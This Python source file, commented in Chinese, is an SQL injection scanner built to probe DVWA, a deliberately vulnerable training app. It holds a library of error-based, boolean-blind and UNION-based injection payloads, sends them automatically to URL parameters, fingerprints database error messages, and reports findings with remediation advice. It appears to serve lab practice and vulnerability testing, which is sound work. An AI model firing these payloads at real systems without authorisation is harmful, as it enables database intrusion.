
import sys
import os
import requests
import urllib.parse
import time
import json
import difflib
import re
import urllib3
from typing import Dict, List, Tuple, Optional, Any
from colorama import Fore, init

# ========== 配置相对路径 ==========
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
# =================================

try:
    from DVWAlogin import DvwaLogin
    print(f"{Fore.GREEN}[INFO] 成功导入DVWA登录模块")
except ImportError as e:
    print(f"{Fore.RED}[ERROR] 无法导入DVWA登录模块: {e}")
    print(f"{Fore.YELLOW}[INFO] 请检查文件路径是否正确")
    sys.exit(1)

# 初始化colorama
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class IntegratedSQLScanner:
    """SQL注入扫描器 """

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.session = None
        self.base_url = None

        # 扫描结果
        self.results = {
            'target_url': None,
            'vulnerabilities': [],
            'scan_time': None,
            'parameters_tested': 0,
            'injection_points_found': 0
        }

        # SQL注入payload库
        self.payloads = {
            'error_based': [
                "'", "''", "`", "\\'", "\"", "\\\"", ";",
                "' OR '1'='1", "' OR 1=1--", "') OR ('1'='1",
                "' OR '1'='1'--", "' OR 'a'='a", "' OR 1=1#",
                "' OR 1=1-- -", "' OR 1=1/*"
            ],
            'boolean_true': [
                "' AND '1'='1", "' AND 1=1--", "') AND ('1'='1",
                "' OR '1'='1'--", "' AND 1=1#"
            ],
            'boolean_false': [
                "' AND '1'='2", "' AND 1=2--", "') AND ('1'='2",
                "' OR '1'='2'--", "' AND 1=2#"
            ],
            'union_based': [
                "' UNION SELECT 1--",
                "' UNION SELECT 1,2--",
                "' UNION SELECT 1,2,3--",
                "' UNION ALL SELECT 1--",
                "' UNION SELECT NULL--",
                "' UNION SELECT 1,2,3,4--",
                "' UNION SELECT 1,2,3,4,5--"
            ]
        }

        # 数据库指纹特征（正则表达式，用于更精确匹配）
        self.db_fingerprints = {
            'mysql': [
                r'you have an error in your sql syntax', 
                r'check the manual that corresponds to your mysql server version',
                r'mysql'
            ],
            'mssql': [
                r'microsoft (?:sql )?server', 
                r'victim of odbc', 
                r'odbc driver', 
                r'unclosed quotation mark', 
                r'closed quotation mark'
            ],
            'oracle': [
                r'ora-\d{5}', 
                r'oracle error', 
                r'pl/sql', 
                r'oracle'
            ],
            'postgresql': [
                r'error: syntax error at or near', 
                r'postgresql', 
                r'pg_'
            ]
        }

    def setup_session(self, dvwa_login_instance: DvwaLogin):
        """设置会话和基础URL"""
        session_info = dvwa_login_instance.get_session_info()
        if not session_info:
            print(f"{Fore.RED}[ERROR] 无法获取会话信息，请先登录")
            return False

        self.session = session_info['session']
        self.base_url = session_info['base_url']
        print(f"{Fore.GREEN}[INFO] 会话设置成功")
        print(f"{Fore.CYAN}[INFO] 基础URL: {self.base_url}")
        return True

    def parse_parameters(self, url: str) -> Dict[str, List[str]]:
        """解析URL参数"""
        parsed = urllib.parse.urlparse(url)
        params = {}

        if parsed.query:
            query_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            params.update(query_params)

        return params

    def send_request(self, url: str, method: str = 'GET',
                     data: Dict = None, params: Dict = None) -> Tuple[bool, Optional[requests.Response]]:
        """发送HTTP请求（统一处理）"""
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, params=params, timeout=self.timeout, verify=False)
            else:
                response = self.session.post(url, data=data, timeout=self.timeout, verify=False)

            return True, response

        except requests.RequestException as e:
            print(f"{Fore.RED}[ERROR] 请求失败: {e}")
            return False, None

    def detect_db_type(self, response_text: str) -> str:
        """使用正则指纹检测数据库类型"""
        if not response_text:
            return 'unknown'

        for db_type, patterns in self.db_fingerprints.items():
            for pattern in patterns:
                try:
                    if re.search(pattern, response_text, flags=re.IGNORECASE):
                        return db_type
                except re.error:
                    # 在极少数情况下，pattern 可能不是合法正则，退回到简单包含判断
                    if pattern.lower() in response_text.lower():
                        return db_type
        return 'unknown'

    def discover_injection_points(self, target_url: str) -> List[Dict[str, Any]]:
        """发现SQL注入点 - Error-based 检测（多条件验证以减少误判）"""
        print(f"{Fore.CYAN}[INFO] 开始发现注入点...")

        injection_points = []
        parsed_params = self.parse_parameters(target_url)

        # 过滤掉像 Submit 这类按钮参数
        ignore_params = {'submit', 'btn', 'button', 'action'}
        testable_params = {k: v for k, v in parsed_params.items()
                           if k.lower() not in ignore_params}

        if not testable_params:
            print(f"{Fore.YELLOW}[WARNING] 未发现可测试参数")
            return injection_points

        print(f"{Fore.GREEN}[INFO] 发现 {len(testable_params)} 个可测参数: {list(testable_params.keys())}")

        for param_name, param_values in testable_params.items():
            print(f"{Fore.CYAN}[TEST] 测试参数: {param_name}")

            # 保存原始值
            original_value = param_values[0] if param_values else ""

            for payload in self.payloads['error_based']:
                # 保留原始值并追加payload
                test_params = {}
                for k, v in parsed_params.items():
                    if k == param_name:
                        test_params[k] = original_value + payload
                    else:
                        test_params[k] = v[0] if v else ""

                success, response = self.send_request(
                    target_url.split('?')[0],
                    params=test_params
                )

                if not success or response is None or response.status_code != 200:
                    continue

                response_text = response.text
                db_type = self.detect_db_type(response_text)

                if db_type != 'unknown':
                    injection_point = {
                        'parameter': param_name,
                        'payload': payload,
                        'type': 'error_based',
                        'db_type': db_type,
                        'confidence': 'high',
                        'original_value': original_value
                    }
                    injection_points.append(injection_point)
                    print(f"{Fore.GREEN}[FOUND] {param_name} -> {db_type} (payload: {payload})")
                    # 保留继续测试的能力，不立刻break，以便发现更多error payloads

        self.results['parameters_tested'] = len(testable_params)
        self.results['injection_points_found'] = len(injection_points)
        return injection_points

    def check_boolean_difference(self, original: str, true_resp: str, false_resp: str) -> bool:
        """智能布尔盲注检测 """
        if not true_resp or not false_resp:
            return False

        # 相似度计算
        def similarity(a, b):
            return difflib.SequenceMatcher(None, a, b).ratio()

        true_sim = similarity(original, true_resp)
        false_sim = similarity(original, false_resp)

        # 计算长度差异百分比
        def len_diff_percent(text1, text2):
            return abs(len(text1) - len(text2)) / max(len(text1), 1) * 100

        # 多条件综合判断
        conditions = [
            len_diff_percent(true_resp, false_resp) > 10,  # 长度差异 > 10%
            abs(true_sim - false_sim) > 0.15,              # 相似度差超过阈值
            true_sim > 0.7 and false_sim > 0.7,            # 都是“有效”页面（非完全错误页面）
            "error" not in true_resp.lower() and "error" not in false_resp.lower()  # 无明显错误提示
        ]

        return sum(conditions) >= 3  # 至少满足3个条件认为存在布尔盲注

    def boolean_blind_injection(self, param_name: str, original_params: Dict, target_url: str) -> Dict[str, Any]:
        """执行布尔盲注检测（基于原始响应 + 真/假对比）"""
        print(f"{Fore.CYAN}[BLIND] 开始布尔盲注测试: {param_name}")

        # 获取基准响应（原始参数）
        success, original_resp = self.send_request(
            target_url.split('?')[0],
            params=original_params
        )

        if not success or original_resp is None or original_resp.status_code != 200:
            return {'vulnerable': False, 'reason': '基准请求失败'}

        original_text = original_resp.text

        # TRUE payload
        true_payload = f"{original_params[param_name]}' AND '1'='1"
        true_params = {**original_params, param_name: true_payload}
        success, true_resp = self.send_request(target_url.split('?')[0], params=true_params)
        if not success or true_resp is None or true_resp.status_code != 200:
            return {'vulnerable': False, 'reason': 'TRUE请求失败'}

        # FALSE payload
        false_payload = f"{original_params[param_name]}' AND '1'='2"
        false_params = {**original_params, param_name: false_payload}
        success, false_resp = self.send_request(target_url.split('?')[0], params=false_params)
        if not success or false_resp is None or false_resp.status_code != 200:
            return {'vulnerable': False, 'reason': 'FALSE请求失败'}

        # 使用多条件检测
        if self.check_boolean_difference(original_text, true_resp.text, false_resp.text):
            return {
                'vulnerable': True,
                'type': 'boolean_blind',
                'confidence': 'medium',
                'true_payload': true_payload,
                'false_payload': false_payload
            }

        return {'vulnerable': False}

    def union_injection_test(self, param_name: str, original_params: Dict, target_url: str) -> Dict[str, Any]:
        """Union注入测试 - 基于基准页面数字比对，尽量减少误判"""
        print(f"{Fore.CYAN}[UNION] 开始Union注入测试: {param_name}")

        # 获取原始响应作为基准
        success, original_resp = self.send_request(target_url.split('?')[0], params=original_params)
        if not success or original_resp is None or original_resp.status_code != 200:
            return {'vulnerable': False}

        # 提取原始页面数字（1-3位），作为基准集合
        original_numbers = set(re.findall(r'\b\d{1,3}\b', original_resp.text))

        # 逐个尝试union payload（按payload顺序代表列数）
        for i, payload in enumerate(self.payloads['union_based'], 1):
            test_params = {**original_params, param_name: payload}
            success, response = self.send_request(target_url.split('?')[0], params=test_params)

            if not success or response is None or response.status_code != 200:
                continue

            current_numbers = set(re.findall(r'\b\d{1,3}\b', response.text))
            new_numbers = current_numbers - original_numbers

            # 期望的数字集合（例如 1,2,3）
            expected_numbers = {str(j) for j in range(1, i + 1)}
            if new_numbers & expected_numbers:
                return {
                    'vulnerable': True,
                    'type': 'union_based',
                    'confidence': 'high',
                    'columns': i,
                    'payload': payload,
                    'reflected_numbers': list(new_numbers)
                }

        return {'vulnerable': False}

    def generate_report(self) -> Dict[str, Any]:
        """生成扫描报告"""
        self.results['scan_time'] = time.strftime('%Y-%m-%d %H:%M:%S')

        report = {
            'scan_summary': {
                'target_url': self.results['target_url'],
                'scan_time': self.results['scan_time'],
                'parameters_tested': self.results['parameters_tested'],
                'injection_points_found': self.results['injection_points_found'],
                'total_vulnerabilities': len(self.results['vulnerabilities'])
            },
            'vulnerabilities': self.results['vulnerabilities'],
            'recommendations': [
                "使用参数化查询或预编译语句",
                "实施输入验证和过滤",
                "使用Web应用防火墙(WAF)",
                "最小权限原则配置数据库账户",
                "定期进行安全测试和代码审计"
            ]
        }

        return report

    def scan_dvwa(self, dvwa_url: str = None):
        """扫描DVWA的SQL注入漏洞"""
        if not self.session or not self.base_url:
            print(f"{Fore.RED}[ERROR] 请先设置会话")
            return None

        # 1. 目标URL准备
        if not dvwa_url:
            target_url = f"{self.base_url}/vulnerabilities/sqli/?id=1&Submit=Submit"
        else:
            target_url = dvwa_url

        self.results['target_url'] = target_url
        print(f"{Fore.YELLOW}[START] 开始SQL注入扫描: {target_url}")

        # 2. 解析参数并过滤不可测参数
        parsed_params = self.parse_parameters(target_url)
        ignore_params = {'submit', 'btn', 'button', 'action'}
        testable_params = {k: v for k, v in parsed_params.items()
                           if k.lower() not in ignore_params}
        single_params = {k: v[0] if v else "" for k, v in testable_params.items()}

        if not testable_params:
            print(f"{Fore.YELLOW}[WARNING] 未发现可测试参数")
            return self.generate_report()

        # 3. 对每个参数执行深度检测（Union -> Boolean -> Error-based）
        for param_name in single_params:
            print(f"{Fore.CYAN}{'=' * 50}")
            print(f"{Fore.CYAN}[*] 深度测试参数: {param_name}")
            print(f"{Fore.CYAN}{'=' * 50}")

            # 3.1 Union注入测试
            print(f"{Fore.MAGENTA}[UNION] 测试Union注入...")
            union_result = self.union_injection_test(param_name, single_params, target_url)
            if union_result.get('vulnerable'):
                self.results['vulnerabilities'].append({
                    'parameter': param_name,
                    'type': 'union_based',
                    'db_type': union_result.get('db_type', 'unknown'),
                    'confidence': union_result.get('confidence', 'high'),
                    'payload': union_result.get('payload'),
                    'columns': union_result.get('columns'),
                    'reflected_numbers': union_result.get('reflected_numbers', [])
                })
                print(f"{Fore.GREEN}[✓] Union注入: 存在 (列数: {union_result.get('columns')})")
            else:
                print(f"{Fore.YELLOW}[-] Union注入: 未发现")

            # 3.2 布尔盲注测试
            print(f"{Fore.MAGENTA}[BOOL] 测试布尔盲注...")
            bool_result = self.boolean_blind_injection(param_name, single_params, target_url)
            if bool_result.get('vulnerable'):
                self.results['vulnerabilities'].append({
                    'parameter': param_name,
                    'type': 'boolean_blind',
                    'db_type': bool_result.get('db_type', 'unknown'),
                    'confidence': bool_result.get('confidence', 'medium'),
                    'true_payload': bool_result.get('true_payload'),
                    'false_payload': bool_result.get('false_payload')
                })
                print(f"{Fore.GREEN}[✓] 布尔盲注: 存在")
            else:
                print(f"{Fore.YELLOW}[-] 布尔盲注: 未发现")

        # 4. Error-based 测试（发现所有payload）
        print(f"{Fore.CYAN}{'=' * 50}")
        print(f"{Fore.CYAN}[INFO] 开始Error-based注入测试...")
        print(f"{Fore.CYAN}{'=' * 50}")

        injection_points = self.discover_injection_points(target_url)

        for point in injection_points:
            self.results['vulnerabilities'].append({
                'parameter': point['parameter'],
                'type': point['type'],
                'db_type': point.get('db_type', 'unknown'),
                'confidence': point['confidence'],
                'payload': point['payload']
            })
            print(f"{Fore.GREEN}[✓] Error注入: {point['payload']}")

        # 5. 生成报告
        print(f"{Fore.CYAN}{'=' * 50}")
        print(f"{Fore.GREEN}扫描完成！生成报告中...")
        return self.generate_report()

    def print_report(self, report: Dict[str, Any]):
        """打印扫描报告"""
        print(f"\n{Fore.YELLOW}{'=' * 60}")
        print(f"{Fore.CYAN}SQL注入扫描报告")
        print(f"{Fore.YELLOW}{'=' * 60}")

        summary = report['scan_summary']
        print(f"{Fore.GREEN}目标URL: {summary['target_url']}")
        print(f"{Fore.GREEN}扫描时间: {summary['scan_time']}")
        print(f"{Fore.GREEN}测试参数: {summary['parameters_tested']}")
        print(f"{Fore.GREEN}发现注入点: {summary['injection_points_found']}")
        print(f"{Fore.GREEN}总漏洞数: {summary['total_vulnerabilities']}")

        if report['vulnerabilities']:
            print(f"\n{Fore.RED}{'!' * 60}")
            print(f"{Fore.RED}发现SQL注入漏洞!")
            print(f"{Fore.RED}{'!' * 60}")

            for i, vuln in enumerate(report['vulnerabilities'], 1):
                print(f"\n{Fore.YELLOW}[漏洞 #{i}]")
                print(f"{Fore.CYAN}参数: {vuln.get('parameter', '未知')}")
                print(f"{Fore.CYAN}类型: {vuln.get('type', '未知')}")
                print(f"{Fore.CYAN}数据库: {vuln.get('db_type', '未知')}")
                print(f"{Fore.CYAN}置信度: {vuln.get('confidence', '未知')}")
                print(f"{Fore.CYAN}Payload: {vuln.get('payload', vuln.get('true_payload', 'N/A'))}")

                # 按类型显示额外信息
                if vuln.get('type') == 'boolean_blind':
                    print(f"{Fore.MAGENTA}布尔盲注 (True payload / False payload):")
                    print(f"  True: {vuln.get('true_payload')}")
                    print(f"  False: {vuln.get('false_payload')}")

                if vuln.get('type') == 'union_based':
                    print(f"{Fore.MAGENTA}Union注入 (columns): {vuln.get('columns')}")
                    if vuln.get('reflected_numbers'):
                        print(f"{Fore.MAGENTA}反射数字示例: {vuln.get('reflected_numbers')}")

        else:
            print(f"\n{Fore.GREEN}{'✓' * 60}")
            print(f"{Fore.GREEN}未发现SQL注入漏洞")
            print(f"{Fore.GREEN}{'✓' * 60}")

        print(f"\n{Fore.CYAN}安全建议:")
        for i, recommendation in enumerate(report['recommendations'], 1):
            print(f"  {i}. {recommendation}")


def main():
    """主函数"""
    print(f"{Fore.CYAN}整合版SQL注入扫描器（已移除时间盲注）")
    print(f"{Fore.CYAN}使用现有的DVWA登录模块")
    print("=" * 50)

    dvwa_url = input("请输入DVWA的URL (例如: http://192.168.26.130:8085): ").strip()
    if not dvwa_url:
        print(f"{Fore.RED}URL不能为空")
        return

    print(f"{Fore.CYAN}[1/3] 初始化登录模块...")
    dvwa_login = DvwaLogin()

    print(f"{Fore.CYAN}[2/3] 登录DVWA...")
    if not dvwa_login.login(dvwa_url):
        print(f"{Fore.RED}登录失败，程序退出")
        return

    # 测试连接（由 DVWAlogin 实现）
    dvwa_login.test_connection()

    print(f"{Fore.CYAN}[3/3] 初始化扫描器...")
    scanner = IntegratedSQLScanner(timeout=15)

    if not scanner.setup_session(dvwa_login):
        print(f"{Fore.RED}设置会话失败")
        return

    print(f"{Fore.CYAN}开始SQL注入漏洞扫描...")
    report = scanner.scan_dvwa()

    if report:
        scanner.print_report(report)

        # 保存报告到相对路径
        report_dir = os.path.join(CURRENT_DIR, 'scan_result', 'sql_scanner')
        os.makedirs(report_dir, exist_ok=True)  # 自动创建目录（如果不存在）

        filename = f"dvwa_sql_scan_report_{int(time.time())}.json"
        filepath = os.path.join(report_dir, filename)

        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        print(f"{Fore.GREEN}报告已保存到: {filepath}")
    else:
        print(f"{Fore.RED}扫描失败")


if __name__ == "__main__":
    main()